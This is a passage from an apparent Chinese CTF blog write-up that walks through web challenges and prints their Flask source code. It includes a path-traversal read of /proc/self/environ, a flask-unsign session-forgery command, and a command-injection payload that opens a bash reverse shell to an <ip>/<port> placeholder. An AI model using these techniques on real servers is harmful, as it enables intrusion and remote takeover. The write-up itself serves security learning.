class="hljs-keyword">if</span> request.method == <span class="hljs-string">&#x27;POST&#x27;</span>:<br>        f = request.files[<span class="hljs-string">&#x27;file&#x27;</span>]<br>        file_path = <span class="hljs-built_in">str</span>(uuid.uuid4()) + <span class="hljs-string">&#x27;_&#x27;</span> + f.filename<br>        f.save(<span class="hljs-string">&#x27;./uploads/&#x27;</span> + file_path)<br>        <span class="hljs-keyword">return</span> redirect(<span class="hljs-string">f&#x27;/upload?file_path=<span class="hljs-subst">&#123;file_path&#125;</span>&#x27;</span>)<br><br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> request.args.get(<span class="hljs-string">&#x27;file_path&#x27;</span>):<br>            <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">            &lt;h1&gt;Upload Image&lt;/h1&gt;</span><br><span class="hljs-string"></span><br><span class="hljs-string">            &lt;form action=&quot;/upload&quot; method=&quot;post&quot; enctype=&quot;multipart/form-data&quot;&gt;</span><br><span class="hljs-string">                &lt;input type=&quot;file&quot; name=&quot;file&quot;&gt;</span><br><span class="hljs-string">                &lt;input type=&quot;submit&quot; value=&quot;Upload&quot;&gt;</span><br><span class="hljs-string">            &lt;/form&gt;</span><br><span class="hljs-string">            &#x27;&#x27;&#x27;</span><br><br>        <span class="hljs-keyword">else</span>:<br>            file_path = <span class="hljs-string">&#x27;./uploads/&#x27;</span> + request.args.get(<span class="hljs-string">&#x27;file_path&#x27;</span>)<br>            <span class="hljs-keyword">if</span> session.get(<span class="hljs-string">&#x27;username&#x27;</span>) != <span class="hljs-string">&#x27;admin&#x27;</span>:<br>                <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(file_path, <span class="hljs-string">&#x27;rb&#x27;</span>) <span class="hljs-keyword">as</span> f:<br>                    content = f.read()<br>                    b64 = base64.b64encode(content)<br>                    <span class="hljs-keyword">return</span> <span class="hljs-string">f&#x27;&lt;img src=&quot;data:image/png;base64,<span class="hljs-subst">&#123;b64.decode()&#125;</span>&quot; alt=&quot;Uploaded Image&quot;&gt;&#x27;</span><br>            <span class="hljs-keyword">else</span>:<br>                os.system(<span class="hljs-string">f&#x27;base64 <span class="hljs-subst">&#123;file_path&#125;</span> &gt; /tmp/<span class="hljs-subst">&#123;file_path&#125;</span>.b64&#x27;</span>)<br>                <span class="hljs-comment"># with open(f&#x27;/tmp/&#123;file_path&#125;.b64&#x27;, &#x27;r&#x27;) as f:</span><br>                <span class="hljs-comment">#     return f&#x27;&lt;img src=&quot;data:image/png;base64,&#123;f.read()&#125;&quot; alt=&quot;Uploaded Image&quot;&gt;&#x27;</span><br>                <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;Sorry, but you are not allowed to view this image.&#x27;</span><br><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    app.run(host=<span class="hljs-string">&#x27;0.0.0.0&#x27;</span>, port=<span class="hljs-number">5000</span>)<br></code></pre></td></tr></table></figure><p>再去读环境变量 SECRET_KEY，<code>/upload?file_path=../../../proc/self/environ</code></p><p>得到 <code>SECRET_KEY=S3cRetK3y</code>，用这个去伪造 session 即可</p><p><code>flask-unsign --sign --secret S3cRetK3y --cookie &#39;&#123;&quot;username&quot;: &quot;admin&quot;&#125;&#39;</code></p><p>得 <code>session=eyJ1c2VybmFtZSI6ImFkbWluIn0.aAw2XA.m_Yd0e8dH5qUhifde_NwJL5l6vE</code></p><p>而后根据这段代码进行命令注入</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">else</span>:<br>            file_path = <span class="hljs-string">&#x27;./uploads/&#x27;</span> + request.args.get(<span class="hljs-string">&#x27;file_path&#x27;</span>)<br>            <span class="hljs-keyword">if</span> session.get(<span class="hljs-string">&#x27;username&#x27;</span>) != <span class="hljs-string">&#x27;admin&#x27;</span>:<br>                <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(file_path, <span class="hljs-string">&#x27;rb&#x27;</span>) <span class="hljs-keyword">as</span> f:<br>                    content = f.read()<br>                    b64 = base64.b64encode(content)<br>                    <span class="hljs-keyword">return</span> <span class="hljs-string">f&#x27;&lt;img src=&quot;data:image/png;base64,<span class="hljs-subst">&#123;b64.decode()&#125;</span>&quot; alt=&quot;Uploaded Image&quot;&gt;&#x27;</span><br>            <span class="hljs-keyword">else</span>:<br>                os.system(<span class="hljs-string">f&#x27;base64 <span class="hljs-subst">&#123;file_path&#125;</span> &gt; /tmp/<span class="hljs-subst">&#123;file_path&#125;</span>.b64&#x27;</span>)<br>                <span class="hljs-comment"># with open(f&#x27;/tmp/&#123;file_path&#125;.b64&#x27;, &#x27;r&#x27;) as f:</span><br>                <span class="hljs-comment">#     return f&#x27;&lt;img src=&quot;data:image/png;base64,&#123;f.read()&#125;&quot; alt=&quot;Uploaded Image&quot;&gt;&#x27;</span><br>                <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;Sorry, but you are not allowed to view this image.&#x27;</span><br></code></pre></td></tr></table></figure><p>payload 不论是直接读 flag 文件还是反弹 shell 如下即可</p><p><code>a;bash -c &quot;bash -i &gt;&amp; /dev/tcp/&lt;ip&gt;/&lt;port&gt; 0&gt;&amp;1&quot;;</code></p><p>事后总体感觉是比较老的套路，跟之前 Hgame 的一题有点像，但是当时我的话还是不够熟练，跟不上大佬的速度就抢不到血分了。</p><h1 id="not-so-web-1"><a href="#not-so-web-1" class="headerlink" title="not so web 1"></a>not so web 1</h1><p>base64 拿到源码</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> base64, json, time<br><span class="hljs-keyword">import</span> os, sys, binascii<br><span class="hljs-keyword">from</span> dataclasses <span class="hljs-keyword">import</span> dataclass, asdict<br><span class="hljs-keyword">from</span> typing <span class="hljs-keyword">import</span> <span class="hljs-type">Dict</span>, <span class="hljs-type">Tuple</span><br><span class="hljs-keyword">from</span> secret <span class="hljs-keyword">import</span> KEY, ADMIN_PASSWORD<br><span class="hljs-keyword">from</span> Crypto.Cipher <span class="hljs-keyword">import</span> AES<br><span class="hljs-keyword">from</span> Crypto.Util.Padding <span class="hljs-keyword">import</span> pad, unpad<br><span class="hljs-keyword">from</span> flask <span class="hljs-keyword">import</span> (<br>    Flask,<br>    render_template,<br>    render_template_string,<br>    request,<br>    redirect,<br>    url_for,<br>    flash,<br>    session,<br>)<br><br>app = Flask(__name__)<br>app.secret_key = KEY<br><br><br><span class="hljs-meta">@dataclass(<span class="hljs-params">kw_only=<span class="hljs-literal">True</span></span>)</span><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">APPUser</span>:<br>    name: <span class="hljs-built_in">str</span><br>    password_raw: <span class="hljs-built_in">str</span><br>    register_time: <span class="hljs-built_in">int</span><br><br><br><span class="hljs-comment">#  In-memory store for user registration</span><br>users: <span class="hljs-type">Dict</span>[<span class="hljs-built_in">str</span>, APPUser] = &#123;<br>    <span class="hljs-string">&quot;admin&quot;</span>: APPUser(name=<span class="hljs-string">&quot;admin&quot;</span>, password_raw=ADMIN_PASSWORD, register_time=-<span class="hljs-number">1</span>)<br>&#125;<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">validate_cookie</span>(<span class="hljs-params">cookie: <span class="hljs-built_in">str</span></span>) -&gt; <span class="hljs-built_in">bool</span>:<br>    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> cookie:<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br><br>    <span class="hljs-keyword">try</span>:<br>        cookie_encrypted = base64.b64decode(cookie, validate=<span class="hljs-literal">True</span>)<br>    <span class="hljs-keyword">except</span> binascii.Error:<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br><br>    <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(cookie_encrypted) &lt; <span class="hljs-number">32</span>:<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br><br>    <span class="hljs-keyword">try</span>:<br>        iv, padded = cookie_encrypted[:<span class="hljs-number">16</span>], cookie_encrypted[<span class="hljs-number">16</span>:]<br>        cipher = AES.new(KEY, AES.MODE_CBC, iv)<br>        cookie_json = cipher.decrypt(padded)<br>    <span class="hljs-keyword">except</span> ValueError:<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br><br>    <span class="hljs-keyword">try</span>:<br>        _ = json.loads(cookie_json)<br>    <span class="hljs-keyword">except</span> Exception:<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br><br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">True</span><br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">parse_cookie</span>(<span class="hljs-params">cookie: <span class="hljs-built_in">str</span></span>) -&gt; <span class="hljs-type">Tuple</span>[<span class="hljs-built_in">bool</span>, <span class="hljs-built_in">str</span>]:<br>    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> cookie:<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span>, <span class="hljs-string">&quot;&quot;</span><br><br>    <span class="hljs-keyword">try</span>:<br>        cookie_encrypted = base64.b64decode(cookie, validate=<span class="hljs-literal">True</span>)<br>    <span class="hljs-keyword">except</span> binascii.Error:<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span>, <span class="hljs-string">&quot;&quot;</span><br><br>    <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(cookie_encrypted) &lt; <span class="hljs-number">32</span>:<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span>, <span class="hljs-string">&quot;&quot;</span><br><br>    <span class="hljs-keyword">try</span>:<br>        iv, padded = cookie_encrypted[:<span class="hljs-number">16</span>], cookie_encrypted[<span class="hljs-number">16</span>:]<br>        cipher = AES.new(KEY, AES.MODE_CBC, iv)<br>        decrypted = cipher.decrypt(padded)<br>        cookie_json_bytes = unpad(decrypted, <span class="hljs-number">16</span>)<br>        cookie_json = cookie_json_bytes.decode()<br>    <span class="hljs-keyword">except</span> ValueError:<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span>, <span class="hljs-string">&quot;&quot;</span><br><br>    <span class="hljs-keyword">try</span>:<br>        cookie_dict = json.loads(cookie_json)<br>    <span class="hljs-keyword">except</span> Exception:<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span>, <span class="hljs-string">&quot;&quot;</span><br><br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">True</span>, cookie_dict.get(<span class="hljs-string">&quot;name&quot;</span>)<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">generate_cookie</span>(<span class="hljs-params">user: APPUser</span>) -&gt; <span class="hljs-built_in">str</span>:<br>    cookie_dict = asdict(user)<br>    cookie_json = json.dumps(cookie_dict)<br>    cookie_json_bytes = cookie_json.encode()<br>    iv = os.urandom(<span class="hljs-number">16</span>)<br>    padded = pad(cookie_json_bytes, <span class="hljs-number">16</span>)<br>    cipher = AES.new(KEY, AES.MODE_CBC, iv)<br>    encrypted = cipher.encrypt(padded)<br>    <span class="hljs-keyword">return</span> base64.b64encode(iv + encrypted).decode()<br><br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&quot;/&quot;</span></span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">index</span>():<br>    <span class="hljs-keyword">if</span> validate_cookie(request.cookies.get(<span class="hljs-string">&quot;jwbcookie&quot;</span>)):<br>        <span class="hljs-keyword">return</span> redirect(url_for(<span class="hljs-string">&quot;home&quot;</span>))<br>    <span class="hljs-keyword">return</span> redirect(url_for(<span class="hljs-string">&quot;login&quot;</span>))<br><br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&quot;/register&quot;</span>, methods=[<span class="hljs-string">&quot;GET&quot;</span>, <span class="hljs-string">&quot;POST&quot;</span>]</span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">register</span>():<br>    <span class="hljs-keyword">if</span> request.method == <span class="hljs-string">&quot;POST&quot;</span>:<br>        user_name = request.form[<span class="hljs-string">&quot;username&quot;</span>]<br>        password = request.form[<span class="hljs-string">&quot;password&quot;</span>]<br>        <span class="hljs-keyword">if</span> user_name <span class="hljs-keyword">in</span> users:<br>            flash(<span class="hljs-string">&quot;Username already exists!&quot;</span>, <span class="hljs-string">&quot;danger&quot;</span>)<br>        <span class="hljs-keyword">else</span>:<br>            users[user_name] = APPUser(<br>                name=user_name, password_raw=password, register_time=<span class="hljs-built_in">int</span>(time.time())<br>            )<br>            flash(<span class="hljs-string">&quot;Registration successful! Please login.&quot;</span>, <span class="hljs-string">&quot;success&quot;</span>)<br>            <span class="hljs-keyword">return</span> redirect(url_for(<span class="hljs-string">&quot;login&quot;</span>))<br>    <span class="hljs-keyword">return</span> render_template(<span class="hljs-string">&quot;register.html&quot;</span>)<br><br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&quot;/login&quot;</span>, methods=[<span class="hljs-string">&quot;GET&quot;</span>, <span class="hljs-string">&quot;POST&quot;</span>]</span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">login</span>():<br>    <span class="hljs-keyword">if</span> request.method == <span class="hljs-string">&quot;POST&quot;</span>:<br>        username = request.form[<span class="hljs-string">&quot;username&quot;</span>]<br>        password = request.form[<span class="hljs-string">&quot;password&quot;</span>]<br>        <span class="hljs-keyword">if</span> username <span class="hljs-keyword">in</span> users <span class="hljs-keyword">and</span> users[username].password_raw == password:<br>            resp = redirect(url_for(<span class="hljs-string">&quot;home&quot;</span>))<br>            resp.set_cookie(<span class="hljs-string">&quot;jwbcookie&quot;</span>, generate_cookie(users[username]))<br>            <span class="hljs-keyword">return</span> resp<br>        <span class="hljs-keyword">else</span>:<br>            flash(<span class="hljs-string">&quot;Invalid credentials. Please try again.&quot;</span>, <span class="hljs-string">&quot;danger&quot;</span>)<br>    <span class="hljs-keyword">return</span> render_template(<span class="hljs-string">&quot;login.html&quot;</span>)<br><br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&quot;/home&quot;</span></span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">home</span>():<br>    valid, current_username = parse_cookie(request.cookies.get(<span class="hljs-string">&quot;jwbcookie&quot;</span>))<br>    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> valid <span class="hljs-keyword">or</span> <span class="hljs-keyword">not</span> current_username:<br>        <span class="hljs-keyword">return</span> redirect(url_for(<span class="hljs-string">&quot;logout&quot;</span>))<br><br>    user_profile = users.get(current_username)<br>    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> user_profile:<br>        <span class="hljs-keyword">return</span> redirect(url_for(<span class="hljs-string">&quot;logout&quot;</span>))<br><br>    <span class="hljs-keyword">if</span> current_username == <span class="hljs-string">&quot;admin&quot;</span>:<br>        payload = request.args.get(<span class="hljs-string">&quot;payload&quot;</span>)<br>        html_template = <span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">&lt;!DOCTYPE html&gt;</span><br><span class="hljs-string">&lt;html lang=&quot;en&quot;&gt;</span><br><span class="hljs-string">&lt;head&gt;</span><br><span class="hljs-string">    &lt;meta charset=&quot;UTF-8&quot;&gt;</span><br><span class="hljs-string">    &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt;</span><br><span class="hljs-string">    &lt;title&gt;Home&lt;/title&gt;</span><br><span class="hljs-string">    &lt;link rel=&quot;stylesheet&quot; href=&quot;https://stackpath.bootstrapcdn.com/bootstrap/4.5.2/css/bootstrap.min.css&quot;&gt;</span><br><span class="hljs-string">    &lt;link rel=&quot;stylesheet&quot; href=&quot;&#123;&#123; url_for(&#x27;static&#x27;, filename=&#x27;styles.css&#x27;) &#125;&#125;&quot;&gt;</span><br><span class="hljs-string">&lt;/head&gt;</span><br><span class="hljs-string">&lt;body&gt;</span><br><span class="hljs-string">    &lt;div class=&quot;container&quot;&gt;</span><br><span class="hljs-string">        &lt;h2 class=&quot;text-center&quot;&gt;Welcome, %s !&lt;/h2&gt;</span><br><span class="hljs-string">        &lt;div class=&quot;text-center&quot;&gt;</span><br><span class="hljs-string">            Your payload: %s</span><br><span class="hljs-string">        &lt;/div&gt;</span><br><span class="hljs-string">        &lt;img src=&quot;&#123;&#123; url_for(&#x27;static&#x27;, filename=&#x27;interesting.jpeg&#x27;) &#125;&#125;&quot; alt=&quot;Embedded Image&quot;&gt;</span><br><span class="hljs-string">        &lt;div class=&quot;text-center&quot;&gt;</span><br><span class="hljs-string">            &lt;a href=&quot;/logout&quot; class=&quot;btn btn-danger&quot;&gt;Logout&lt;/a&gt;</span><br><span class="hljs-string">        &lt;/div&gt;</span><br><span class="hljs-string">    &lt;/div&gt;</span><br><span class="hljs-string">&lt;/body&gt;</span><br><span class="hljs-string">&lt;/html&gt;</span><br><span class="hljs-string">&quot;&quot;&quot;</span> % (<br>            current_username,<br>            payload,<br>        )<br>    <span class="hljs-keyword">else</span>:<br>        html_template = (<br>            <span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">&lt;!DOCTYPE html&gt;</span><br><span class="hljs-string">&lt;html lang=&quot;en&quot;&gt;</span><br><span class="hljs-string">&lt;head&gt;</span><br><span class="hljs-string">    &lt;meta charset=&quot;UTF-8&quot;&gt;</span><br><span class="hljs-string">    &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt;</span><br><span class="hljs-string">    &lt;title&gt;Home&lt;/title&gt;</span><br><span class="hljs-string">    &lt;link rel=&quot;stylesheet&quot; href=&quot;https://stackpath.bootstrapcdn.com/bootstrap/4.5.2/css/bootstrap.min.css&quot;&gt;</span><br><span class="hljs-string">    &lt;link rel=&quot;stylesheet&quot; href=&quot;&#123;&#123; url_for(&#x27;static&#x27;, filename=&#x27;styles.css&#x27;) &#125;&#125;&quot;&gt;</span><br><span class="hljs-string">&lt;/head&gt;</span><br><span class="hljs-string">&lt;body&gt;</span><br><span class="hljs-string">    &lt;div class=&quot;container&quot;&gt;</span><br><span class="hljs-string">        &lt;h2 class=&quot;text-center&quot;&gt;server code (encoded)&lt;/h2&gt;</span><br><span class="hljs-string">        &lt;div class=&quot;text-center&quot; style=&quot;word-break:break-all;&quot;&gt;</span><br><span class="hljs-string">        &#123;%% raw %%&#125;</span><br><span class="hljs-string">            %s</span><br><span class="hljs-string">        &#123;%% endraw %%&#125;</span><br><span class="hljs-string">        &lt;/div&gt;</span><br><span class="hljs-string">        &lt;div class=&quot;text-center&quot;&gt;</span><br><span class="hljs-string">            &lt;a href=&quot;/logout&quot; class=&quot;btn btn-danger&quot;&gt;Logout&lt;/a&gt;</span><br><span class="hljs-string">        &lt;/div&gt;</span><br><span class="hljs-string">    &lt;/div&gt;</span><br><span class="hljs-string">&lt;/body&gt;</span><br><span class="hljs-string">&lt;/html&gt;</span><br><span class="hljs-string">&quot;&quot;&quot;</span><br>            % base64.b64encode(<span class="hljs-built_in">open</span>(__file__, <span class="hljs-string">&quot;rb&quot;</span>).read()).decode()<br>        )<br>    <span class="hljs-keyword">return</span> render_template_string(html_template)<br><br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&quot;/logout&quot;</span></span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">logout</span>():<br>    resp = redirect(url_for(<span class="hljs-string">&quot;login&quot;</span>))<br>    resp.delete_cookie(<span class="hljs-string">&quot;jwbcookie&quot;</span>)<br>    <span class="hljs-keyword">return</span> resp<br><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br>    app.run()<br></code></pre></td></tr></table></figure><p>思路：CBC 反转攻击，拿 cookie，SSTI</p><h1 id="Excellent-Site"><a href="#Excellent-Site" class="headerlink" title="Excellent-Site"></a>Excellent-Site</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> smtplib <br><span class="hljs-keyword">import</span> imaplib<br><span class="hljs-keyword">import</span> email<br><span class="hljs-keyword">import</span> sqlite3<br><span class="hljs-keyword">from</span> urllib.parse <span class="hljs-keyword">import</span> urlparse<br><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">from</span> email.header <span class="hljs-keyword">import</span> decode_header<br><span class="hljs-keyword">from</span> flask <span class="hljs-keyword">import</span> *<br><br>app = Flask(__name__)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">get_subjects</span>(<span class="hljs-params">username, password</span>):<br>    imap_server = <span class="hljs-string">&quot;ezmail.org&quot;</span><br>    imap_port = <span class="hljs-number">143</span><br>    <span class="hljs-keyword">try</span>:<br>        mail = imaplib.IMAP4(imap_server, imap_port)<br>        mail.login(username, password)<br>        mail.select(<span class="hljs-string">&quot;inbox&quot;</span>)<br>        status, messages = mail.search(<span class="hljs-literal">None</span>, <span class="hljs-string">&#x27;FROM &quot;admin@ezmail.org&quot;&#x27;</span>)<br>        <span class="hljs-keyword">if</span> status != <span class="hljs-string">&quot;OK&quot;</span>:<br>            <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;&quot;</span><br>        subject = <span class="hljs-string">&quot;&quot;</span><br>        latest_email = messages[<span class="hljs-number">0</span>].split()[-<span class="hljs-number">1</span>]<br>        status, msg_data = mail.fetch(latest_email, <span class="hljs-string">&quot;(RFC822)&quot;</span>)<br>        <span class="hljs-keyword">for</span> response_part <span class="hljs-keyword">in</span> msg_data:<br>            <span class="hljs-keyword">if</span> <span class="hljs-built_in">isinstance</span>(response_part, <span class="hljs-built_in">tuple</span>):<br>                msg = email.message_from_bytes(response_part  [<span class="hljs-number">1</span>])<br>                subject, encoding = decode_header(msg[<span class="hljs-string">&quot;Subject&quot;</span>])  [<span class="hljs-number">0</span>]<br>                <span class="hljs-keyword">if</span> <span class="hljs-built_in">isinstance</span>(subject, <span class="hljs-built_in">bytes</span>):<br>                    subject = subject.decode(encoding <span class="hljs-keyword">if</span> encoding <span class="hljs-keyword">else</span> <span class="hljs-string">&#x27;utf-8&#x27;</span>)<br>        mail.logout()<br>        <span 